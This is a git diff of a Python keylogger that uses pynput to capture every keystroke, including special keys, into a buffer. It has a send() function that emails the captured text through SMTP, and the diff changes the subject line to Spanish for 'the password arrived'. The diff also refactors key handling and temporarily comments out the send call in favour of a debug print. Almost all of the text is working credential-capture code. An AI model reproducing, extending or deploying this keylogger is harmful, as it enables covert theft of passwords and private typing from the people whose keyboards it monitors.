@@ -2,6 +2,7 @@ from pynput import keyboard
 import smtplib
 import os
 from email.message import EmailMessage
+from enum import Enum
 
 email = os.environ.get("EMAIL_USER")
 passw = os.environ.get("EMAIL_PASS")
@@ -22,26 +23,20 @@ def on_press(key):
     # palabra.append(key.char)
     global text
     #   text += str(key.char)
-    if str(key) == "Key.enter":
-        text += "\n"
-    elif str(key) == "Key.space":
-        text += " "
-    elif str(key) == "Key.backspace":
-        text += "%se borró una letra%"
-    elif str(key) == "Key.up":
-        text += "%flecha arriba%"
-    elif str(key) == "Key.down":
-        text +="%flecha abajo%"
-    elif str(key) == "Key.left":
-        text +="%flecha izquierda%"
-    elif str(key) == "Key.right":
-        text +="%flecha derecha%"
-    elif str(key) == "Key.esc" or str(key) == "Key.shift_r" or str(key) == "Key.shift" or str(
-            key) == "Key.alt_gr" or str(key) == "Key.ctrl_l":
-        pass
+
+    if isinstance(key, Enum):
+        if str(key) == "Key.enter":
+            text += "\n"
+        elif str(key) == "Key.space":
+            text += " "
+        else:
+            print(str(key))
+            text += " >>"+str(key)+"<< "
     else:
         print(key)
         text += key.char
+
+
 
 
 def on_release(key):
@@ -51,7 +46,7 @@ def on_release(key):
 
 def send(text):
     msg = EmailMessage()
-    msg['Subject'] = 'Grab dinner this weekend?'
+    msg['Subject'] = 'Llegó la clave 7u7'
     msg['From'] = email
     msg['To'] = email
     msg.set_content(f'Se detectó lo siguiente:\n{text}')
@@ -63,10 +58,14 @@ def send(text):
 def test(text):
     print("Al final sale:\n{0}".format(text))
 
+def to_array(text):
+    print(text.split())
+
 def main():
     read()
     test(text)
-    send(text)
+#   send(text)
+    to_array(text)
 
 
 if __name__ == "__main__":
